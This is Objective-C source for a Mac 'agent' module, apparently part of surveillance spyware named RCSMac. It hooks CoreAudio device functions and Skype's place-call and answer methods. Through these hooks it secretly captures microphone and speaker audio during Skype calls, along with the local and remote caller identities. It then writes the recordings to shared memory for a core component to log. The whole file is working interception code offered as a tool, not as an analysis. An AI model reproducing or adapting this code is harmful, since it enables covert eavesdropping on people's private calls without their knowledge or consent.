//
//  RCSMAgentVoip_IM.m
//  RCSMac
//
//  Created by revenge on 10/23/09.
//  Copyright 2009 __MyCompanyName__. All rights reserved.
//

#import <pthread.h>
#import <sys/time.h>

#import "RCSMAgentVoipSkype.h"
#import "RCSMCommon.h"


static AudioDeviceID inputDeviceID  = 0;
static AudioDeviceID outputDeviceID = 0;
static void *inputClientData        = 0;
static void *outputClientData       = 0;

static u_int gMaxSampleSize         = (512 * 1024); // 512KB
static u_int gCompressFactor        = 3;

static int64_t startedInputRec      = 0;
static int64_t startedOutputRec     = 0;

static int inBufferCounter          = 0;
static int outBufferCounter         = 0;

static Float64 inSampleRate         = 0;
static Float64 outSampleRate        = 0;

//static NSMutableData *inBuffer      = nil;
//static NSMutableData *outBuffer     = nil;

static NSString *gLocalPeerName     = nil;
static NSString *gRemotePeerName    = nil;

static BOOL gIsSkypeVoipAgentActive = NO;

pthread_mutex_t gCallbackMutex  = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t gInputMutex     = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t gOutputMutex    = PTHREAD_MUTEX_INITIALIZER;

static NSLock *logLock;


void VPSKypeStartAgent()
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
#ifdef DEBUG
  NSLog(@"Setting up agent voip parameters");
#endif
  //
  // Read configuration
  //
  NSMutableData *readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_AGENT
                                                                 forAgent: AGENT_VOIP
                                                          withCommandType: CM_AGENT_CONF];
  
  if (readData != nil)
    {
#ifdef DEBUG
      NSLog(@"Found configuration for Agent Voip");
#endif
      shMemoryLog *shMemLog = (shMemoryLog *)[readData bytes];
      
      NSMutableData *confData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                              length: shMemLog->commandDataSize];
      
      voipStruct *voipConfiguration = (voipStruct *)[confData bytes];
      
      gMaxSampleSize  = voipConfiguration->sampleSize;
      gCompressFactor = voipConfiguration->compression;
      
      [confData release];
    }
  else
    {
#ifdef DEBUG
      NSLog(@"No configuration found for agent Voip");
#endif
    }
  
  gMaxSampleSize *= 8;
  
#ifdef DEBUG
  NSLog(@"sampleSize  : %d", gMaxSampleSize);
  NSLog(@"compression : %d", gCompressFactor);
#endif
  
  gIsSkypeVoipAgentActive = YES;
  
  [outerPool release];
}

void VPSKypeStopAgent()
{
  gIsSkypeVoipAgentActive = NO;
  
#ifdef DEBUG
  NSLog(@"Stopping voip skype hooks");
#endif
}

BOOL logCall (u_int channel, BOOL closeCall)
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG
  NSLog(@"Generating log for channel %d", channel);
#endif
  
  NSMutableData *entryData  = [[NSMutableData alloc] initWithLength: sizeof(voipAdditionalStruct)];
  //short dummyWord           = 0x0000;
  /*
  time_t unixTime;
  time(&unixTime);
  */
  struct timeval t;
  int success = gettimeofday(&t, NULL);
  int64_t filetime;
  
  if (success == 0)
    {
      filetime = ((int64_t)t.tv_sec * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
    }
  else
    {
#ifdef DEBUG_ERRORS
      NSLog(@"error on gettimeofday()");
#endif
    }
  
  int64_t startedTime;
  
  if (channel == CHANNEL_MICROPHONE)
    {
      startedTime = (int64_t)startedInputRec;

      [logLock lock];
      startedInputRec = filetime;
      [logLock unlock];
    }
  else if (channel == CHANNEL_SPEAKERS)
    {
      startedTime = (int64_t)startedOutputRec;
      
      [logLock lock];
      startedOutputRec = filetime;
      [logLock unlock];
    }
  
  voipAdditionalStruct *voipAdditionalHeader = (voipAdditionalStruct *)[entryData bytes];
  voipAdditionalHeader->version           = LOG_VOIP_VERSION;
  voipAdditionalHeader->channel           = channel;
  voipAdditionalHeader->programType       = AGENT_VOIP + VOIP_SKYPE;
  //voipAdditionalHeader->sampleRate        = SAMPLE_RATE_SKYPE;
  voipAdditionalHeader->sampleRate        = (channel == CHANNEL_MICROPHONE) ? inSampleRate : outSampleRate;
  voipAdditionalHeader->isIngoing         = 0;
  voipAdditionalHeader->hiStartTimestamp  = (int64_t)startedTime >> 32;
  voipAdditionalHeader->loStartTimestamp  = (int64_t)startedTime & 0xFFFFFFFF;
  voipAdditionalHeader->hiStopTimestamp   = (int64_t)filetime >> 32;
  voipAdditionalHeader->loStopTimestamp   = (int64_t)filetime & 0xFFFFFFFF;

#ifdef DEBUG_VERBOSE_1
  NSLog(@"hiStartFromInput: %x", voipAdditionalHeader->hiStartTimestamp);
  NSLog(@"loStartFromInput: %x", voipAdditionalHeader->loStartTimestamp);
#endif

#ifdef DEBUG_ERRORS
  if (voipAdditionalHeader->hiStartTimestamp == 0)
    NSLog(@"hiStartTime is ZERO!!!!!!!!!!!!!!!!!!!!!!!!!");
  if (voipAdditionalHeader->loStartTimestamp == 0)
    NSLog(@"loStartTime is ZERO!!!!!!!!!!!!!!!!!!!!!!!!!");
  if (voipAdditionalHeader->hiStopTimestamp == 0)
    NSLog(@"hiStopTime is ZERO!!!!!!!!!!!!!!!!!!!!!!!!!");
  if (voipAdditionalHeader->loStopTimestamp == 0)
    NSLog(@"loStopTime is ZERO!!!!!!!!!!!!!!!!!!!!!!!!!");
#endif

  [logLock lock];
  voipAdditionalHeader->localPeerLength   = [gLocalPeerName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  voipAdditionalHeader->remotePeerLength  = [gRemotePeerName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  [logLock unlock];
  
  [logLock lock];
  // Local Peer Name
  [entryData appendData: [gLocalPeerName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  // Null terminator
  //[entryData appendBytes: &dummyWord
  //                length: sizeof(short)];
  
  // Remote Peer Name
  [entryData appendData: [gRemotePeerName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [logLock unlock];
  
  // Null terminator
  //[entryData appendBytes: &dummyWord
  //                length: sizeof(short)];
  
  u_int flags = (channel == CHANNEL_MICROPHONE)
                            ? SKYPE_CHANNEL_INPUT
                            : SKYPE_CHANNEL_OUTPUT;
  
  if (closeCall == YES)
    {
      flags |= SKYPE_CLOSE_CALL;
    }
  
  NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_VOIP;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_CLOSE_LOG_WITH_HEADER;
  
  struct timeval tTime;
  gettimeofday(&tTime, NULL);
  int highSec = (int32_t)tTime.tv_sec << 20;
  shMemoryHeader->timestamp       = highSec | tTime.tv_usec;
  
  //NSLog(@"Header - timestamp: %x", shMemoryHeader->timestamp);
  
  shMemoryHeader->flag            = flags;
  shMemoryHeader->commandDataSize = [entryData length];
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  if ([mSharedMemoryLogging writeMemory: logData
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG
      NSLog(@"Voip close_log data sent through Shared Memory");
#endif
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Error while logging voip to shared memory");
#endif
    }
  
  [logData release];
  [entryData release];
  [outerPool drain];
  
  [logLock unlock];
  
  return TRUE;
}


OSStatus
_hook_AudioDeviceIOProcInput (AudioDeviceID         inDevice,
                              const AudioTimeStamp  *inNow,
                              const AudioBufferList *inInputData,
                              const AudioTimeStamp  *inInputTime,
                              AudioBufferList       *outOutputData,
                              const AudioTimeStamp  *inOutputTime,
                              void                  *inClientData)
{
  OSStatus status;
  
  if (startedInputRec == 0)
    {
      /*
      time_t unixTime;
      time(&unixTime);
      time(&unixTime);
      */
      
      struct timeval t;
      int success = gettimeofday(&t, NULL);
      
      if (success == 0)
        {
          startedInputRec = ((int64_t)t.tv_sec * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
        }
      else
        {
#ifdef DEBUG_ERRORS
          NSLog(@"error on gettimeofday()");
#endif
        }
      
      //[logLock lock];
      //startedInputRec = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
      //[logLock unlock];
    }
  
  status = _real_AudioDeviceIOProcInput(inDevice,
                                        inNow,
                                        inInputData,
                                        inInputTime,
                                        outOutputData,
                                        inOutputTime,
                                        inputClientData);
  
  if (inInputData->mNumberBuffers > 0)
    {
      if (gIsSkypeVoipAgentActive == YES)
        {
          if (inInputData->mBuffers[0].mData != NULL)
            {
              if (inBufferCounter >= gMaxSampleSize)
                {
                  logCall (CHANNEL_MICROPHONE, NO);
                  inBufferCounter = 0;
                }
              
              pthread_mutex_lock(&gInputMutex);
              NSMutableData *entryData = [[NSMutableData alloc] initWithBytes: inInputData->mBuffers[0].mData
                                                                       length: inInputData->mBuffers[0].mDataByteSize ];
              
              NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
              shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
              
              inBufferCounter += [entryData length];
              
              shMemoryHeader->status          = SHMEM_WRITTEN;
              shMemoryHeader->agentID         = AGENT_VOIP;
              shMemoryHeader->direction       = D_TO_CORE;
              shMemoryHeader->commandType     = CM_LOG_DATA;
              
              struct timeval tTime;
              gettimeofday(&tTime, NULL);
              int highSec = (int32_t)tTime.tv_sec << 20;
              shMemoryHeader->timestamp       = highSec | tTime.tv_usec;
              
              shMemoryHeader->flag            = SKYPE_CHANNEL_INPUT;
              shMemoryHeader->commandDataSize = [entryData length];
              
              //NSLog(@"entryData length: %d", [entryData length]);
              
              memcpy(shMemoryHeader->commandData,
                     [entryData bytes],
                     [entryData length]);
              
              if ([mSharedMemoryLogging writeMemory: logData
                                             offset: 0
                                      fromComponent: COMP_AGENT] == TRUE)
                {
#ifdef DEBUG_VERBOSE_1
                  NSLog(@"Voip data sent through Shared Memory");
#endif
                }
              else
                {
#ifdef DEBUG_VERBOSE_1
                  NSLog(@"Error while logging voip to shared memory");
#endif
                }
              
              [entryData release];
              [logData release];
              
              pthread_mutex_unlock(&gInputMutex);
            }
        }
    }
  
  usleep(2000);
  
  return status;
}

OSStatus
_hook_AudioDeviceIOProcOutput (AudioDeviceID         inDevice,
                               const AudioTimeStamp  *inNow,
                               const AudioBufferList *inInputData,
                               const AudioTimeStamp  *inInputTime,
                               AudioBufferList       *outOutputData,
                               const AudioTimeStamp  *inOutputTime,
                               void                  *inClientData)
{
  OSStatus status;
  
  if (startedOutputRec == 0)
    {
      /*
      time_t unixTime;
      time(&unixTime);
      time(&unixTime);
      */
      
      struct timeval t;
      int success = gettimeofday(&t, NULL);
      
      if (success == 0)
        {
          startedOutputRec = ((int64_t)t.tv_sec * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
        }
      else
        {
#ifdef DEBUG_ERRORS
          NSLog(@"error on gettimeofday()");
#endif
        }
      /*
      if (startedOutputRec == startedInputRec)
        {
          NSLog(@"ANOMALY IN ProcOutput! times are equal");
        }
       */
      //[logLock lock];
      //startedOutputRec = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
      //[logLock unlock];
    }
  
  status = _real_AudioDeviceIOProcOutput(inDevice,
                                         inNow,
                                         inInputData,
                                         inInputTime,
                                         outOutputData,
                                         inOutputTime,
                                         outputClientData);
  
  if (outOutputData->mNumberBuffers > 0)
    {
      if (gIsSkypeVoipAgentActive == YES)
        {
          if (outOutputData->mBuffers[0].mData != NULL)
            {
              if (outBufferCounter >= gMaxSampleSize)
                {
                  logCall (CHANNEL_SPEAKERS, NO);
                  outBufferCounter = 0;
                }
              
              pthread_mutex_lock(&gOutputMutex);
              
              NSMutableData *entryData = [[NSMutableData alloc] initWithBytes: outOutputData->mBuffers[0].mData
                                                                       length: outOutputData->mBuffers[0].mDataByteSize ];
              
              outBufferCounter += [entryData length];
              
              NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
              shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
              
              shMemoryHeader->status          = SHMEM_WRITTEN;
              shMemoryHeader->agentID         = AGENT_VOIP;
              shMemoryHeader->direction       = D_TO_CORE;
              shMemoryHeader->commandType     = CM_LOG_DATA;
              
              struct timeval tTime;
              gettimeofday(&tTime, NULL);
              int highSec = (int32_t)tTime.tv_sec << 20;
              shMemoryHeader->timestamp       = highSec | tTime.tv_usec;
              
              shMemoryHeader->flag            = SKYPE_CHANNEL_OUTPUT;
              shMemoryHeader->commandDataSize = [entryData length];
              
              memcpy(shMemoryHeader->commandData,
                     [entryData bytes],
                     [entryData length]);
              
              if ([mSharedMemoryLogging writeMemory: logData
                                             offset: 0
                                      fromComponent: COMP_AGENT] == TRUE)
                {
#ifdef DEBUG_VERBOSE_1
                  NSLog(@"Voip data sent through Shared Memory");
#endif
                }
              else
                {
#ifdef DEBUG_VERBOSE_1
                  NSLog(@"Error while logging voip to shared memory");
#endif
                }
              
              [entryData release];
              [logData release];
              
              pthread_mutex_unlock(&gOutputMutex);
            }
        }
    }
  
  usleep(2000);
  
  return status;
}

OSStatus
_hook_AudioDeviceStart (AudioDeviceID           inDevice,
                        AudioDeviceIOProcID     inProcID)
{
  OSStatus status;

#ifdef DEBUG
  NSLog(@"_hook_AudioDeviceStart called");
#endif
  
  if (gIsSkypeVoipAgentActive == YES)
    {
      if (inProcID == _real_AudioDeviceIOProcInput)
        {
#ifdef DEBUG
          NSLog(@"AudioDeviceStart Input");
#endif
          //voipInputData  = [[NSMutableData alloc] init];
          
          if (inSampleRate == 0)
            {
              AudioStreamBasicDescription streamDesc;
              UInt32 propertySize;
              
              propertySize = sizeof(streamDesc);
              status = AudioDeviceGetProperty(inputDeviceID, 0, true, kAudioDevicePropertyStreamFormat, &propertySize, &streamDesc);
              
              inSampleRate = streamDesc.mSampleRate;
            }
            
#ifdef DEBUG_ERRORS
          AudioStreamBasicDescription streamDesc;
          UInt32 propertySize;
          // Print out the device status
          propertySize = sizeof(streamDesc);
          status = AudioDeviceGetProperty(inputDeviceID, 0, true, kAudioDevicePropertyStreamFormat, &propertySize, &streamDesc);
          
          NSLog(@"Hardware format:");
          NSLog(@"%5d SampleRate", (unsigned int)streamDesc.mSampleRate);
          NSLog(@"%c%c%c%c FormatID",
                (streamDesc.mFormatID & 0xff000000) >> 24,
                (streamDesc.mFormatID & 0x00ff0000) >> 16,
                (streamDesc.mFormatID & 0x0000ff00) >>  8,
                (streamDesc.mFormatID & 0x000000ff) >>  0);
          NSLog(@"%5d BytesPerPacket", streamDesc.mBytesPerPacket);
          NSLog(@"%5d FramesPerPacket", streamDesc.mFramesPerPacket);
          NSLog(@"%5d BytesPerFrame", streamDesc.mBytesPerFrame);
          NSLog(@"%5d ChannelsPerFrame", streamDesc.mChannelsPerFrame);
          NSLog(@"%5d BitsPerChannel", streamDesc.mBitsPerChannel);
          
          printFormatFlags(streamDesc);
#endif
          
          //time_t unixTime;
          //time(&unixTime);
          
          //startedInputRec = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
          
          status = _real_AudioDeviceStart(inDevice, _hook_AudioDeviceIOProcInput);
        }
      else if (inProcID == _real_AudioDeviceIOProcOutput)
        {
#ifdef DEBUG
          NSLog(@"AudioDeviceStart Output");
#endif
          //voipOutputData = [[NSMutableData alloc] init];
          
          if (outSampleRate == 0)
            {
              AudioStreamBasicDescription streamDesc;
              UInt32 propertySize;
              
              propertySize = sizeof(streamDesc);
              status = AudioDeviceGetProperty(outputDeviceID, 0, false, kAudioDevicePropertyStreamFormat, &propertySize, &streamDesc);
              
              outSampleRate = streamDesc.mSampleRate;
            }
#ifdef DEBUG_ERRORS
          AudioStreamBasicDescription streamDesc;
          UInt32 propertySize;
          // Print out the device status
          propertySize = sizeof(streamDesc);
          status = AudioDeviceGetProperty(inputDeviceID, 0, false, kAudioDevicePropertyStreamFormat, &propertySize, &streamDesc);
          
          NSLog(@"Hardware format:");
          NSLog(@"%5d SampleRate", (unsigned int)streamDesc.mSampleRate);
          NSLog(@"%c%c%c%c FormatID",
                (streamDesc.mFormatID & 0xff000000) >> 24,
                (streamDesc.mFormatID & 0x00ff0000) >> 16,
                (streamDesc.mFormatID & 0x0000ff00) >>  8,
                (streamDesc.mFormatID & 0x000000ff) >>  0);
          NSLog(@"%5d BytesPerPacket", streamDesc.mBytesPerPacket);
          NSLog(@"%5d FramesPerPacket", streamDesc.mFramesPerPacket);
          NSLog(@"%5d BytesPerFrame", streamDesc.mBytesPerFrame);
          NSLog(@"%5d ChannelsPerFrame", streamDesc.mChannelsPerFrame);
          NSLog(@"%5d BitsPerChannel", streamDesc.mBitsPerChannel);
          
          printFormatFlags(streamDesc);
#endif
          
          //time_t unixTime;
          //time(&unixTime);
          
          //startedOutputRec = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
          
          status = _real_AudioDeviceStart(inDevice, _hook_AudioDeviceIOProcOutput);
        }
      else
        {
          status = _real_AudioDeviceStart(inDevice, inProcID);
        }
    }
  else
    {
      status = _real_AudioDeviceStart(inDevice, inProcID);
    }
  
#ifdef DEBUG
  NSLog(@"AudioDeviceStart returned: %d", status);
#endif
  
  return status;
}

OSStatus
_hook_AudioDeviceStop (AudioDeviceID           inDevice,
                       AudioDeviceIOProcID     inProcID)
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  OSStatus status;
  
  if (gIsSkypeVoipAgentActive == YES)
    {
      if (inProcID == _real_AudioDeviceIOProcInput)
        {
#ifdef DEBUG
          NSLog(@"AudioDeviceStop Input");
#endif
          status = _real_AudioDeviceStop(inDevice, _hook_AudioDeviceIOProcInput);
          
          //NSLog(@"Logging mic: %d", CHANNEL_MICROPHONE);
          logCall(CHANNEL_MICROPHONE, YES);
          
          startedInputRec = 0;
          inSampleRate    = 0;
        }
      else if (inProcID == _real_AudioDeviceIOProcOutput)
        {
#ifdef DEBUG
          NSLog(@"AudioDeviceStop Output");
#endif
          
          status = _real_AudioDeviceStop(inDevice, _hook_AudioDeviceIOProcOutput);
#ifdef DEBUG
          NSLog(@"Logging speaker: %d", CHANNEL_SPEAKERS);
#endif
          logCall(CHANNEL_SPEAKERS, YES);
          
          startedOutputRec = 0;
          outSampleRate    = 0;
        }
      else
        {
          status = _real_AudioDeviceStop(inDevice, inProcID);
        }
    }
  else
    {
      status = _real_AudioDeviceStop(inDevice, inProcID);
    }
  
#ifdef DEBUG
  NSLog(@"AudioDeviceStop returned: %d", status);
#endif
  
  [outerPool release];
  
  return status;
}

//
// This is used for recording in/out audio on call
//
OSStatus
_hook_AudioDeviceAddIOProc (AudioDeviceID       inDevice,
                            AudioDeviceIOProc   inProc,
                            void               *inClientData)
{
  OSStatus success;
  UInt32 propertySize;
  
  if (_real_AudioDeviceIOProcInput      == 0
      || _real_AudioDeviceIOProcOutput  == 0)
    {
      propertySize = sizeof(inputDeviceID);
      success = AudioHardwareGetProperty(kAudioHardwarePropertyDefaultInputDevice,
                                         &propertySize,
                                         &inputDeviceID);
      if (success == noErr)
        {
          if (inputDeviceID != kAudioDeviceUnknown)
            {
#ifdef DEBUG
              NSLog(@"Found inputDeviceID: %d", inputDeviceID);
#endif
              if (inputDeviceID == inDevice)
                {
#ifdef DEBUG
                  NSLog(@"Registering original Input proc");
#endif
                  _real_AudioDeviceIOProcInput = (void *)inProc;
                  inputClientData = (void *)inClientData;
                }
              else
                {
                  propertySize = sizeof(outputDeviceID);
                  success = AudioHardwareGetProperty(kAudioHardwarePropertyDefaultOutputDevice,
                                                     &propertySize,
                                                     &outputDeviceID);
                  if (success == noErr)
                    {
                      if (outputDeviceID != kAudioDeviceUnknown)
                        {
#ifdef DEBUG
                          NSLog(@"Found outputDeviceID: %d", outputDeviceID);
#endif
                          if (outputDeviceID == inDevice)
                            {
#ifdef DEBUG
                              NSLog(@"Registering original Output proc");
#endif
                              _real_AudioDeviceIOProcOutput = (void *)inProc;
                              outputClientData = (void *)inClientData;
                            }
                        }
                    }
                }
            }
        }
    }
  
  if (gIsSkypeVoipAgentActive == YES)
    {
      if (inDevice == inputDeviceID)
        {
          success = _real_AudioDeviceAddIOProc(inDevice, _hook_AudioDeviceIOProcInput, _hook_AudioDeviceIOProcInput);
        }
      else if (inDevice == outputDeviceID)
        {
          success = _real_AudioDeviceAddIOProc(inDevice, _hook_AudioDeviceIOProcOutput, _hook_AudioDeviceIOProcOutput);
        }
      else
        {
          success = _real_AudioDeviceAddIOProc(inDevice, inProc, inClientData);
        }
    }
  else
    {
      success = _real_AudioDeviceAddIOProc(inDevice, inProc, inClientData);
    }
  
  return success;
}

OSStatus
_hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
                               AudioDeviceIOProc   inProc)
{
  OSStatus status;
#ifdef DEBUG
  NSLog(@"_hook_AudioDeviceRemoveIOProc called");
#endif
  
  if (gIsSkypeVoipAgentActive == YES)
    {
      if (inProc == _real_AudioDeviceIOProcInput)
        {
          status = _real_AudioDeviceRemoveIOProc(inDevice, _hook_AudioDeviceIOProcInput);
          
          _real_AudioDeviceIOProcInput = 0;
          inputClientData = 0;
        }
      else if (inProc == _real_AudioDeviceIOProcOutput)
        {
          status = _real_AudioDeviceRemoveIOProc(inDevice, _hook_AudioDeviceIOProcOutput);
          
          _real_AudioDeviceIOProcOutput = 0;
          outputClientData = 0;
        }
      else
        {
          status = _real_AudioDeviceRemoveIOProc(inDevice, inProc);
        }
    }
  else
    {
      status = _real_AudioDeviceRemoveIOProc(inDevice, inProc);
    }
  
  return status;
}

//
// This is used for reproducing all the sound effects
//
OSStatus
_hook_AudioDeviceCreateIOProcID (AudioDeviceID inDevice,
                                 AudioDeviceIOProc inProc,
                                 void *inClientData,
                                 AudioDeviceIOProcID *outAudioProcID)
{
#ifdef DEBUG
  NSLog(@"_hook_AudioDeviceCreateIOProcID called");
#endif
  
  OSStatus status = _real_AudioDeviceCreateIOProcID(inDevice, inProc, inClientData, outAudioProcID);
  
  return status;
}

OSStatus
_hook_AudioDeviceSetProperty (AudioDeviceID           inDevice,
                              const AudioTimeStamp    *inWhen,
                              UInt32                  inChannel,
                              Boolean                 isInput,
                              AudioDevicePropertyID   inPropertyID,
                              UInt32                  inPropertyDataSize,
                              const void              *inPropertyData) 
{
  OSStatus status;
  
  status = _real_AudioDeviceSetProperty(inDevice,
                                        inWhen,
                                        inChannel,
                                        isInput,
                                        inPropertyID,
                                        inPropertyDataSize,
                                        inPropertyData);
  
  return status;
}

OSStatus
_hook_AudioDeviceGetProperty (AudioDeviceID           inDevice,
                              UInt32                  inChannel,
                              Boolean                 isInput,
                              AudioDevicePropertyID   inPropertyID,
                              UInt32                  *ioPropertyDataSize,
                              void                    *outPropertyData)
{
  OSStatus status;
  
  status = _real_AudioDeviceGetProperty(inDevice,
                                        inChannel,
                                        isInput,
                                        inPropertyID,
                                        ioPropertyDataSize,
                                        outPropertyData);
  
  return status;
}

@implementation myMacCallX// (skypeVoiceHook)

- (uint)placeCallToHook: (id)arg1
{
#ifdef DEBUG
  NSLog(@"placeCallToHook called");
#endif

  [NSThread detachNewThreadSelector: @selector(checkActiveMembersName)
                           toTarget: self
                         withObject: nil];
  
  return [self placeCallToHook: arg1];
}

- (void)answerHook
{
#ifdef DEBUG
  NSLog(@"answerHook called");
#endif

  [NSThread detachNewThreadSelector: @selector(checkActiveMembersName)
                           toTarget: self
                         withObject: nil];
  
  return [self answerHook];
}

- (void)checkActiveMembersName
{
#ifdef DEBUG
  NSLog(@"Checking Active Members");
#endif

  BOOL membersFound     = NO;
  NSArray *remotePeers  = nil;
  
  while (membersFound == NO)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      remotePeers = [self performSelector: @selector(callMemberIdentities)];
      
      if ([remotePeers isKindOfClass: [NSArray class]]
          && [remotePeers count] > 0)
        {
          [logLock lock];
          gRemotePeerName = [[remotePeers objectAtIndex: 0] retain];
          gLocalPeerName  = [[self performSelector: @selector(hostIdentity)] copy];
          [logLock unlock];
          
          if (gRemotePeerName != nil && gLocalPeerName != nil)
            {
              membersFound = YES;
#ifdef DEBUG_VERBOSE_1
              NSLog(@"Members Found!");
              NSLog(@"local: %@", gLocalPeerName);
              NSLog(@"remote: %@", gRemotePeerName);
#endif
            }
        }
      
      [innerPool release];
      sleep(1);
    }
}

@end